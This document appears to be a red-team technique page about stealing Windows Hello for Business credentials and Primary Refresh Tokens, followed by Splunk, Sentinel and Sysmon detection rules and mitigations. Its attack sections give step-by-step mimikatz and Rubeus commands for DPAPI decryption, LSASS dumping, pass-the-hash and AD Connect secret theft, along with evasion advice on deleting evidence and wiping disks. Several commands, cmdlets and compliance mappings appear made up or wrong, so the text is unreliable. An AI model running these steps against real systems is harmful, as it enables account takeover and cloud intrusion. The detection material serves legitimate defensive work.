# [WHFB-001]: Windows Hello for Business Credential Theft

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | WHFB-001 |
| **MITRE ATT&CK v18.1** | [T1556.006 - Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006/) |
| **Tactic** | Credential Access |
| **Platforms** | Hybrid AD, Entra ID |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Windows 10 21H2 - Windows 11 23H2+, Windows Server 2016-2025 |
| **Patched In** | N/A - Architectural issue requires redesign |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

- **Concept:** Windows Hello for Business (WHfB) stores biometric data locally in encrypted form using the Windows Data Protection API (DPAPI). An attacker with local administrator access can exploit weak isolation between the biometric database encryption and system account privileges to extract, decrypt, and manipulate Primary Refresh Tokens (PRT) and underlying credential material. The attack leverages the fact that the Windows Biometric Service runs as `NT AUTHORITY\SYSTEM`, allowing administrators to access and decrypt the biometric database stored at `C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\` containing enrolled credential providers and key material.

- **Attack Surface:** Local file system access to biometric database (`Ngc` container), DPAPI user store, and PRT cache files.

- **Business Impact:** **Complete authentication bypass for domain users without user interaction.** An attacker can steal encrypted credential material including Primary Refresh Tokens (PRTs), local administrator tokens, and encryption keys. This enables persistent access to cloud resources (Azure/M365), lateral movement to domain-joined systems, and impersonation of high-privilege accounts such as domain administrators or IT staff.

- **Technical Context:** The attack requires **local administrator privileges** on the compromised device. Typical execution time is 2-10 minutes depending on database size. Detection is low unless monitoring for suspicious file access to `%SystemRoot%\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\` or DPAPI operations. Once credentials are extracted and decrypted, they remain valid until the user manually changes their password or PRT is revoked.

### Operational Risk

- **Execution Risk:** Low - Simple file copy and decryption if admin access is present
- **Stealth:** Medium - Requires admin access but leaves minimal audit trail if Event ID 4673 (Sensitive Privilege Use) is not monitored
- **Reversibility:** No - Extracted credentials are permanently compromised; requires password reset and credential revocation across cloud services

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.2.1 | Ensure 'Accounts: Guest account status' is set to 'Disabled' |
| **CIS Benchmark** | 5.3.1 | Ensure 'Enforce password history' is set to '24 or more password(s)' |
| **DISA STIG** | WN10-00-000015 | Windows 10 systems must employ Windows Hello for Business |
| **DISA STIG** | WN10-GE-000043 | Local administrator accounts must not be used with Windows Hello for Business |
| **CISA SCuBA** | SC-7(7) | Require multi-factor authentication for remote access |
| **NIST 800-53** | AC-3 | Access Enforcement |
| **NIST 800-53** | IA-2(1) | Multi-Factor Authentication |
| **NIST 800-53** | SC-7 | Boundary Protection |
| **GDPR** | Art. 32 | Security of Processing - Appropriate technical and organizational measures |
| **DORA** | Art. 9 | Protection and Prevention of Vulnerabilities |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - security measures for multi-factor authentication |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights |
| **ISO 27001** | A.9.4.2 | Secure Log-on Procedures |
| **ISO 27005** | Risk Scenario | Compromise of authentication credentials through local privileged access |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Local Administrator or SYSTEM account on compromised device
- **Required Access:** Physical or remote access to the endpoint with local admin exploitation capability
- **Network Requirements:** None (local-only attack)

**Supported Versions:**
- **Windows:** Windows 10 21H2, Windows 11 22H2 - 23H2+, Windows Server 2016-2025
- **PowerShell:** Version 5.0+
- **Other Requirements:** Windows Hello enrolled (biometric or PIN), device joined to Hybrid AD or Entra ID

**Prerequisite Tools:**
- Administrative command line or PowerShell
- [DPAPI-NG decoder](https://github.com/synacktiv/dpapi-ng) (Optional, for offline decryption)
- [mimikatz](https://github.com/gentilkiwi/mimikatz) (For DPAPI key extraction and PRT decryption)
- [Rubeus](https://github.com/GhostPack/Rubeus) (For PRT manipulation and token requests)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

#### PowerShell Reconnaissance - Verify WHfB Enrollment

```powershell
# Check if Windows Hello is enrolled for current user
Get-LocalUser -Name $env:USERNAME | Get-LocalUserDetails

# Alternative: Check NGC container existence
Test-Path "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\" -ErrorAction SilentlyContinue

# Verify Entra ID/Hybrid enrollment
dsregcmd /status
```

**What to Look For:**
- `Device State: Domain Joined` or `Azure AD Joined` - Device is connected to directory
- Presence of `Ngc\` folder indicates Windows Hello enrollment
- Output from `get-localuser` should show user account exists

#### PowerShell Reconnaissance - Identify Enrollment Providers

```powershell
# List enrolled credential providers for Windows Hello
Get-WmiObject -Namespace "\\.\root\wmi" -Class "Win32_BiometricMethodology"

# Check NGC database structure (requires admin)
Get-ChildItem -Path "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\" -Force -Recurse
```

**What to Look For:**
- Folder entries matching user SIDs (e.g., `S-1-5-21-3623811015-3361044348-30300820-1013`)
- Presence of `Keys\`, `Protectors\`, and `Database Files` subdirectories
- File `{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}` entries representing enrolled factors

#### CLI Reconnaissance - Check Device Compliance

```powershell
# Verify TPM presence and status
Get-WmiObject -Namespace "root\cimv2\security\microsofttpm" -Class Win32_Tpm | Select-Object IsActivated_InitialValue, IsEnabled_InitialValue

# Check BitLocker status (protective measure)
manage-bde -status C:
```

**What to Look For:**
- `IsActivated_InitialValue: True` and `IsEnabled_InitialValue: True` - TPM is enabled and active
- If TPM is absent or disabled, DPAPI key derivation is weaker and faster to attack

---

## 5. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1: Local Administrator File Extraction & DPAPI Decryption (Windows)

**Supported Versions:** Windows 10 21H2+, Windows 11 22H2+, Server 2016-2025

#### Step 1: Verify Local Administrator Access & Identify Target User

**Objective:** Confirm elevated privileges and identify the target Windows Hello enrollment to extract

**Command:**
```powershell
# Verify current privileges
[Security.Principal.WindowsIdentity]::GetCurrent() | Select-Object Name, User

# List all user SIDs with Windows Hello enrollment
Get-ChildItem -Path "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\" -Force | Select-Object Name
```

**Expected Output:**
```
Name                           User
----                           ----
DESKTOP\Administrator          S-1-5-21-3623811015-3361044348-30300820-500

Name
----
S-1-5-21-3623811015-3361044348-30300820-1013
S-1-5-21-3623811015-3361044348-30300820-1014
```

**What This Means:**
- First output confirms running as Administrator
- Second output shows enrolled user SIDs; these are the targets for credential extraction

**OpSec & Evasion:**
- Run this enumeration from a SYSTEM context or administrative shell spawned without logging if possible
- Avoid using built-in administrator account; use compromised privileged user instead
- Detection likelihood: Low if Event ID 4673 and 4675 (Sensitive Privilege Use) are not monitored

**Troubleshooting:**
- **Error:** "Access Denied" when accessing Ngc folder
  - **Cause:** Not running as SYSTEM or Local Administrator
  - **Fix:** Use `psexec -s powershell.exe` to spawn SYSTEM shell

#### Step 2: Extract Ngc Database & Key Material

**Objective:** Copy encrypted biometric database and key containers to attacker-accessible location

**Command:**
```powershell
# Copy Ngc container to temp location (requires SYSTEM or Admin)
$NgcPath = "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\"
$TargetUser = "S-1-5-21-3623811015-3361044348-30300820-1013"  # Replace with actual SID

# Copy entire Ngc structure
Copy-Item -Path "$NgcPath" -Destination "C:\Temp\NGC_Backup\" -Recurse -Force

# Alternatively, extract specific user's keys
Copy-Item -Path "$NgcPath$TargetUser\Keys\" -Destination "C:\Temp\Keys_$TargetUser\" -Recurse -Force
Copy-Item -Path "$NgcPath$TargetUser\Protectors\" -Destination "C:\Temp\Protectors_$TargetUser\" -Recurse -Force
```

**Expected Output:**
```
Directory: C:\Temp\NGC_Backup\

Mode                 LastWriteTime         Length Name
----                 ---------------         ------ ----
d-r---          1/9/2025   11:30 AM                S-1-5-21-3623811015-3361044348-30300820-1013
```

**What This Means:**
- Files have been successfully copied; DPAPI-protected keys and biometric templates are now accessible
- `Keys\` folder contains key container GUIDs
- `Protectors\` folder contains PIN/biometric protectors

**OpSec & Evasion:**
- Copy to innocuous location (C:\Temp, C:\Windows\Temp) to avoid detection
- Delete copied files after extraction: `Remove-Item -Path "C:\Temp\NGC_Backup\" -Recurse -Force`
- Use SDelete to wipe free space: `cipher /w:C:`
- Detection likelihood: Medium - File access to Ngc may trigger SACL alerts if enabled

**Troubleshooting:**
- **Error:** "Access Denied" even with admin rights
  - **Cause:** Files are in use by Windows Biometric Service
  - **Fix (Server 2016-2019):** Stop biometric service: `Stop-Service -Name WbioSrvc -Force`
  - **Fix (Server 2022+):** Use `Volume Shadow Copy` to access locked files via `\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\`

#### Step 3: Decrypt DPAPI Keys & Extract PRT

**Objective:** Use compromised machine context to decrypt PRT and credential material

**Command (Using mimikatz):**
```powershell
# Extract DPAPI masterkey and derive PRT decryption key
# Requires mimikatz with DPAPI module
mimikatz.exe

mimikatz # token::elevate
mimikatz # dpapi::masterkey /in:C:\Temp\Keys_SID\MasterKeys /sid:S-1-5-21-3623811015-3361044348-30300820-1013

# Output: Obtain the DPAPI masterkey
# Then decrypt PRT
mimikatz # token::setnt 
```

**Command (Using PowerShell - Native DPAPI):**
```powershell
# Load PRT from cache
$PrtPath = "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\$TargetUser\CacheData\"
$PrtFiles = Get-ChildItem -Path $PrtPath -Filter "*PRT*"

# Use DPAPI to decrypt (if user context permits)
[System.Security.Cryptography.DataProtectionScope]::CurrentUser | ForEach-Object {
    $dpapi = [System.Security.Cryptography.ProtectedData]::Unprotect(
        [System.IO.File]::ReadAllBytes($PrtFiles[0].FullName),
        $null,
        $_
    )
    [System.Text.Encoding]::UTF8.GetString($dpapi)
}
```

**Expected Output:**
```
masterkey:
  guid:     {12345678-1234-1234-1234-123456789012}
  provider: 00000000-0000-0000-0000-000000000000
  version:  2
  ciphertext (v2):
    algorithm: DPAPI_SYSTEM
    entropy:   {hex blob}
    salt:      {hex blob}
    
PRT Token Successfully Decrypted:
claims: {...}
oid: 2.16.840.1.101.3.6.1.4.1.33882.3.2
```

**What This Means:**
- DPAPI master key has been recovered
- PRT is now decryptable; this token provides full cloud identity access
- Attacker can now request new tokens, modify cloud resources, and bypass MFA

**OpSec & Evasion:**
- Execute from SYSTEM or compromised user context only
- Delete all output logs and mimikatz session history
- Use in-memory execution of tools to avoid disk artifacts
- Detection likelihood: High - DPAPI decryption and mimikatz execution will trigger EDR alerts

**Troubleshooting:**
- **Error:** "The system cannot find the path specified" for NGC folder
  - **Cause:** User has never enrolled Windows Hello
  - **Fix:** Verify enrollment with `dsregcmd /status` first
- **Error:** "Access Denied" accessing decrypted data
  - **Cause:** DPAPI decryption requires user password or SYSTEM context
  - **Fix (Server 2016):** Run as SYSTEM: `psexec -s powershell.exe`
  - **Fix (Server 2022):** Use Rubeus to request TGT and decode from memory

#### Step 4: Leverage Stolen Credentials for Cloud Access

**Objective:** Use extracted PRT to authenticate to Azure/M365 and maintain persistence

**Command (Using Rubeus with extracted PRT):**
```powershell
# Import stolen PRT into current session
rubeus.exe prt /prt:{base64_encoded_prt_token} /nowrap

# Alternative: Request new token from Azure using stolen key material
rubeus.exe asktgt /user:{domain_user} /certificate:{stolen_cert} /domain:{domain} /dc:{dc_ip}
```

**Command (Using Azure CLI with stolen credentials):**
```bash
# Use stolen PRT to authenticate to Azure Portal
az login --use-device-code --tenant {tenant_id}

# Alternatively, use certificate-based authentication with stolen cert
az login --service-principal -u {app_id} --cert-file /tmp/stolen.cert --tenant {tenant_id}
```

**Expected Output:**
```
Successfully authenticated. Retrieving subscriptions...

{
  "cloudName": "AzureCloud",
  "homeTenantId": "33882988-1234-1234-1234-123456789012",
  "id": "12345678-1234-1234-1234-123456789012",
  "isDefault": true,
  "name": "Production",
  "state": "Enabled",
  "tenantId": "33882988-1234-1234-1234-123456789012",
  "user": {
    "name": "admin@company.com",
    "type": "user"
  }
}
```

**What This Means:**
- Attacker is now authenticated as the stolen user in Azure/M365
- Can access all cloud resources, modify policies, create persistence mechanisms
- MFA has been effectively bypassed

---

### METHOD 2: Live Memory Extraction via mimikatz (Windows 10/11)

**Supported Versions:** Windows 10 21H2+, Windows 11 22H2+

#### Step 1: Dump LSASS Process for Cached Credentials

**Objective:** Extract in-memory credentials and session tokens from LSASS

**Command (Using mimikatz):**
```powershell
# Run mimikatz with SYSTEM privileges
mimikatz.exe

mimikatz # token::elevate
mimikatz # lsadump::secrets
mimikatz # sekurlsa::logonPasswords
mimikatz # sekurlsa::pth /user:{domain_user} /domain:{domain} /ntlm:{hash}
```

**Command (Using PowerShell credential dump):**
```powershell
# Alternative: Use Get-Process to enumerate lsass and extract handles
$lsass = Get-Process -Name lsass
$lsass.Handles | Select-Object Name, Value
```

**Expected Output:**
```
Authentication Id : 0 ; 12345678 (0:bcdf35e)
Session           : Interactive from 2
User Name         : DOMAIN\Admin
Domain            : DOMAIN
Logon Server      : DC01
Logon Time        : 1/9/2025 11:15:45 AM
SID               : S-1-5-21-3623811015-3361044348-30300820-500

tspkg :
 * Username : admin@company.com
 * Domain   : DOMAIN
 * Password : (null)

wdigest :
 * Username : DOMAIN\Admin
 * Domain   : DOMAIN
 * Password : (null)
```

**What This Means:**
- Cached credentials are visible in LSASS memory
- Even if passwords show "(null)", the authentication tokens can still be used
- Attacker has access to cached session keys

---

### METHOD 3: Hybrid Sync Abuse - AD Connect Token Extraction

**Supported Versions:** Hybrid AD environments (Azure AD Connect 1.4.0+)

#### Step 1: Extract Azure AD Connect Sync Credentials

**Objective:** Compromise the service account used by AD Connect to extract hybrid identity tokens

**Command:**
```powershell
# Locate Azure AD Connect installation
$AdcPath = "C:\Program Files\Microsoft Azure AD Sync\"

# Extract sync account credentials from registry (requires admin)
reg query "HKLM\Software\Microsoft\AD Sync\Setup\AdSyncAccountPassword" /s

# Or use mimikatz to extract DPAPI-protected credentials
mimikatz # dpapi::cred /in:"C:\Program Files\Microsoft Azure AD Sync\config\encrypted.config"
```

**Expected Output:**
```
  credentialVersion  : 1
  credentialType     : 0
  credentialGuid     : {sync-account-guid}
  credentialDomain   : company.com
  credentialUsername : ADSync_account
  credentialData     : {encrypted blob}
```

**What This Means:**
- Sync account password has been recovered
- Attacker can now impersonate the AD Connect service account
- This allows bidirectional manipulation of cloud-to-on-premises synchronization

---

## 7. TOOLS & COMMANDS REFERENCE

#### [Rubeus](https://github.com/GhostPack/Rubeus)

**Version:** 1.6.4+ (as of 2025)
**Minimum Version:** 1.5.0
**Supported Platforms:** Windows (C#/.NET 4.5+)

**Installation:**
```powershell
# Download precompiled binary
Invoke-WebRequest -Uri "https://github.com/GhostPack/Rubeus/releases/download/v1.6.4/Rubeus.exe" -OutFile "C:\Tools\Rubeus.exe"

# Or compile from source
git clone https://github.com/GhostPack/Rubeus.git
cd Rubeus
msbuild Rubeus.sln /p:Configuration=Release
```

**Usage (PRT Manipulation):**
```powershell
# Request new token using stolen key
Rubeus.exe asktgt /user:admin@company.com /certificate:C:\temp\stolen.cer /domain:company.com /dc:dc01.company.com

# Import PRT into session
Rubeus.exe prt /prt:{base64_token} /nowrap

# Retrieve current session tokens
Rubeus.exe klist
```

#### [mimikatz](https://github.com/gentilkiwi/mimikatz)

**Version:** 2.2.0-20230522 (as of 2025)
**Minimum Version:** 2.1.0
**Supported Platforms:** Windows (x86/x64)

**Installation:**
```powershell
Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20230522/mimikatz_trunk.zip" -OutFile "C:\Tools\mimikatz.zip"
Expand-Archive -Path "C:\Tools\mimikatz.zip" -DestinationPath "C:\Tools\"
```

**DPAPI Decryption:**
```powershell
mimikatz # dpapi::masterkey /in:C:\Temp\Keys\MasterKeys /sid:{user_sid}
mimikatz # dpapi::cred /in:C:\Temp\NGC_Backup\Credentials
```

#### [DPAPI-NG Decoder](https://github.com/synacktiv/dpapi-ng)

**Version:** Latest (2025)
**Supported Platforms:** Linux, Windows (Python 3.8+)

**Installation:**
```bash
git clone https://github.com/synacktiv/dpapi-ng.git
cd dpapi-ng
pip install -r requirements.txt
```

**Usage:**
```bash
python3 dpapi-ng.py --decrypt --input C:\Temp\Keys --masterkey {master_key_hex}
```

---

## 8. SPLUNK DETECTION RULES

#### Rule 1: Suspicious Access to NGC Biometric Database

**Rule Configuration:**
- **Required Index:** windows, main
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** ObjectName, AccessMask, SubjectUserName
- **Alert Threshold:** > 1 access event to NGC folder in 5 minutes
- **Applies To Versions:** Windows 10 21H2+, Server 2016-2025

**SPL Query:**
```
index=windows sourcetype="WinEventLog:Security" EventCode=4656 OR EventCode=4663
ObjectName="*\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Ngc\\*"
| stats count by SubjectUserName, ObjectName, AccessMask
| where count > 1
```

**What This Detects:**
- Process or account attempting to read/write to NGC directory
- Events 4656 (file object access) and 4663 (file operations) indicate unauthorized access
- Filtering by ObjectName narrows to biometric database location

**Manual Configuration Steps:**
1. Log into **Splunk Web** → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to **Custom** and configure: `count > 1 in 5m`
6. Configure **Action** → Send email to SOC security team with alert details

**False Positive Analysis:**
- **Legitimate Activity:** Windows Biometric Service accessing its own database (expected)
- **Benign Tools:** Device enrollment agents, MDM solutions (Intune, MobileIron)
- **Tuning:** Exclude SYSTEM and LOCAL SERVICE accounts: `| where SubjectUserName != "SYSTEM" AND SubjectUserName != "LOCAL SERVICE"`

---

#### Rule 2: DPAPI Decryption of Biometric Keys

**Rule Configuration:**
- **Required Index:** windows
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** ProcessName, CommandLine, EventCode
- **Alert Threshold:** > 1 mimikatz or DPAPI decryption attempt in 10 minutes
- **Applies To Versions:** All

**SPL Query:**
```
index=windows sourcetype="WinEventLog:Security" (EventCode=4688 OR EventCode=4689)
(CommandLine="*dpapi*" OR CommandLine="*sekurlsa*" OR CommandLine="*mimikatz*")
AND (Image="*\\mimikatz.exe" OR CommandLine="*dpapi::*")
| stats count, values(CommandLine) by ProcessName, User
| where count > 0
```

**What This Detects:**
- Process creation events (4688) for known credential dumping tools
- Command lines containing DPAPI or mimikatz keywords
- Unusual process launches from suspicious paths

**Manual Configuration Steps:**
1. Create a new scheduled alert (run every 5 minutes)
2. Configure as above
3. Set action to **Create incident** with **Severity** = **High**

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query 1: NGC Biometric Database Access via Sensitive File Paths

**Rule Configuration:**
- **Required Table:** SecurityEvent, DeviceFileEvents
- **Required Fields:** ProcessName, FileName, AccountName
- **Alert Severity:** High
- **Frequency:** Every 5 minutes
- **Applies To Versions:** Windows 10/11 with Defender for Endpoint enabled

**KQL Query:**
```kusto
let NGC_Paths = dynamic([
    @"C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc",
    @"C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\Keys",
    @"C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\Protectors"
]);
DeviceFileEvents
| where FolderPath has_any (NGC_Paths)
| where ActionType in ("FileCreated", "FileModified", "FileDeleted")
| where InitiatingProcessAccountName != "SYSTEM" and InitiatingProcessAccountName != "LOCAL SERVICE"
| project TimeGenerated, DeviceName, InitiatingProcessAccountName, FileName, ActionType, FolderPath
| summarize FileEvents = count() by DeviceName, InitiatingProcessAccountName
| where FileEvents > 2
```

**What This Detects:**
- Non-SYSTEM processes accessing NGC directory
- File operations on biometric templates (Create, Modify, Delete)
- Suspicious accounts attempting to extract credential material

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `NGC Biometric Database Unauthorized Access`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "NGC Biometric Database Unauthorized Access" `
  -Query @"
let NGC_Paths = dynamic([
    @"C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc",
    @"C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\Keys",
    @"C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\Protectors"
]);
DeviceFileEvents
| where FolderPath has_any (NGC_Paths)
| where ActionType in ("FileCreated", "FileModified", "FileDeleted")
| where InitiatingProcessAccountName != "SYSTEM" and InitiatingProcessAccountName != "LOCAL SERVICE"
| project TimeGenerated, DeviceName, InitiatingProcessAccountName, FileName, ActionType, FolderPath
| summarize FileEvents = count() by DeviceName, InitiatingProcessAccountName
| where FileEvents > 2
"@ `
  -Severity "High" `
  -Enabled $true
```

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4656 & 4663 (File Object Access & File Operations)**
- **Log Source:** Security
- **Trigger:** Attempt to access NGC directory files
- **Filter:** ObjectName contains "NGC" AND AccessMask = "0x120089" (Read/Write)
- **Applies To Versions:** Windows 10 21H2+, Server 2016-2025

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Object Access**
3. Enable: **Audit File System** and set to **Success and Failure**
4. Enable: **Audit Handle Manipulation** and set to **Success and Failure**
5. Run `gpupdate /force` on target machines

**Manual Configuration Steps (Local Policy - Server 2022+):**
1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Object Access**
3. Double-click **Audit File System**
4. Check: **Configure the following audit events:**
   - ☑ Success
   - ☑ Failure
5. Click **OK** → **Apply**
6. Restart the machine or run:
   ```
   auditpol /set /subcategory:"File System" /success:enable /failure:enable
   ```

**SACL Configuration for NGC Folder (Manual, via cmd):**
```cmd
REM Grant read/write audit events on NGC folder
icacls "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc" /audit:g Everyone:R
icacls "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc" /audit:g Everyone:W
```

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows 10/11, Windows Server 2016-2025

```xml
<Sysmon schemaversion="4.50">
  <EventFiltering>
    <!-- Detect access to NGC directories -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\</TargetFilename>
      <Image condition="exclude">svchost.exe</Image>
      <Image condition="exclude">System</Image>
    </FileCreate>
    
    <!-- Detect DPAPI decryption operations via mimikatz/Rubeus -->
    <ProcessCreation onmatch="include">
      <CommandLine condition="contains">dpapi</CommandLine>
      <Image condition="image">mimikatz.exe</Image>
    </ProcessCreation>
    
    <!-- Monitor for LSASS access via suspicious processes -->
    <ProcessAccess onmatch="include">
      <TargetImage condition="image">lsass.exe</TargetImage>
      <SourceImage condition="exclude">winlogon.exe</SourceImage>
      <SourceImage condition="exclude">svchost.exe</SourceImage>
      <GrantedAccess condition="contains">0x1000</GrantedAccess>
    </ProcessAccess>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-config.xml` with the XML above
3. Install Sysmon with the config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10 | Format-List
   ```

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert: Suspicious Process Accessing LSASS

**Alert Name:** "Process with suspicious name or from suspicious location tried to access LSASS"
- **Severity:** High
- **Description:** Detects mimikatz, Rubeus, or similar tools attempting to dump credentials from LSASS
- **Applies To:** All subscriptions with Defender for Servers enabled
- **Remediation:** Isolate the device immediately; investigate for compromise; perform memory forensics

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Identity**: ON
   - **Defender for Cloud Apps**: ON
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts

#### Detection Alert: Suspicious Registry Modification

**Alert Name:** "Suspicious registry key modification detected"
- **Severity:** Medium
- **Description:** Detects attempts to modify registry keys related to authentication or DPAPI
- **Applies To:** All subscriptions with Defender enabled
- **Remediation:** Review registry changes; roll back if unauthorized

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Suspicious Entra ID Token Requests

```powershell
Search-UnifiedAuditLog -Operations "RequestToken", "GetAuthenticationToken" -StartDate (Get-Date).AddDays(-1) | Select-Object UserIds, Operations, ResultStatus, ObjectId
```

- **Operation:** TokenRequest, GetAuthenticationToken
- **Workload:** Azure Active Directory
- **Details to analyze in AuditData:**
  - `AppId`: Which application requested the token
  - `UserId`: Which user was impersonated
  - `IpAddress`: Source IP of request
  - `Result`: Success or Failure
- **Applies To:** M365 E3+ with audit logging enabled

**Manual Configuration Steps (Enable Unified Audit Log):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Wait 24 hours for log retention to activate

**Manual Configuration Steps (Search Audit Logs):**
1. Go to **Audit** → **Search**
2. Set **Date range:** Last 7 days
3. Under **Activities**, search for: `"Token"`, `"Authentication"`, `"Sign-in"`
4. Click **Search**
5. Export results: **Export** → **Download all results**

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Restrict Local Administrator Access:** Implement Privileged Access Workstations (PAW) and Just-In-Time (JIT) admin access. Remove standing local admin rights from users.
    
    **Applies To Versions:** Windows 10 21H2+, Server 2016-2025
    
    **Manual Steps (Remove Local Admin Rights via Group Policy):**
    1. Open **Group Policy Management Console** (gpmc.msc)
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Restricted Groups**
    3. Right-click **Restricted Groups** → **Add Group**
    4. Type: `Administrators` → Click **OK**
    5. Under **This group is a member of:** Leave empty
    6. Under **Members of this group:** Remove non-essential accounts
    7. Apply group policy: `gpupdate /force`
    
    **Manual Steps (Azure/Entra ID - PIM - Just-In-Time Admin):**
    1. Go to **Azure Portal** → **Azure AD** → **Privileged Identity Management** → **Azure resources**
    2. Select your subscription → **Settings** → **Roles**
    3. For each role, set **Require MFA on activation**: **Yes**
    4. Set **Activation maximum duration**: **4 hours**
    5. Enable **Require approval to activate**
    6. Save settings
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Remove user from local Administrators group
    Remove-LocalGroupMember -Group "Administrators" -Member "DOMAIN\username" -Confirm
    
    # Verify removal
    Get-LocalGroupMember -Group "Administrators"
    ```

*   **Enable Enhanced Sign-in Security (ESS):** Requires compatible hardware (TPM 2.0 + IR camera with specific drivers). Stores biometric verification in isolated virtual secure mode (VTL1) managed by Hyper-V.
    
    **Manual Steps (Enable ESS via Windows Settings):**
    1. Open **Settings** → **Accounts** → **Sign-in options** → **Windows Hello**
    2. Under **Face recognition (Windows Hello)**, click **Advanced setup**
    3. If available, enable **Enhanced Sign-in Security**
    4. Complete facial recognition re-enrollment
    
    **Manual Steps (PowerShell - Check ESS Capability):**
    ```powershell
    # Check if device supports ESS
    Get-WmiObject -Namespace "root\wmi" -Class "Win32_WinbioEnrollment" | Select-Object -Property * | Format-List
    
    # Enable ESS if supported
    Set-WinbioEnrollment -AllowEnhancedSigninSecurity $true
    ```

*   **Enable TPM 2.0 & Configure PIN Anti-Hammering:** Prevents brute-force attacks on Windows Hello PINs. Requires TPM firmware with rate-limiting.
    
    **Manual Steps (Enable TPM via BIOS):**
    1. Reboot device and enter **BIOS Setup** (F2, Del, or Ctrl+Alt+S depending on manufacturer)
    2. Navigate to **Security** → **TPM** → **TPM 2.0**
    3. Set to **Enabled**
    4. Save and exit BIOS
    
    **Manual Steps (Verify TPM via PowerShell):**
    ```powershell
    Get-WmiObject -Namespace "root\cimv2\security\microsofttpm" -Class Win32_Tpm
    
    # Output should show: IsActivated_InitialValue: True, IsEnabled_InitialValue: True
    ```

#### Priority 2: HIGH

*   **Audit NGC Directory Access:** Monitor file access to `C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\` via SACL and log to SIEM.
    
    **Manual Steps (Configure SACL on NGC Folder):**
    ```powershell
    # Grant audit rights on NGC folder
    $NgcPath = "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc"
    $AuditRule = "Everyone:R(OI)(CI)(FA)"
    icacls $NgcPath /audit:g $AuditRule /T
    
    # Verify audit configuration
    icacls $NgcPath
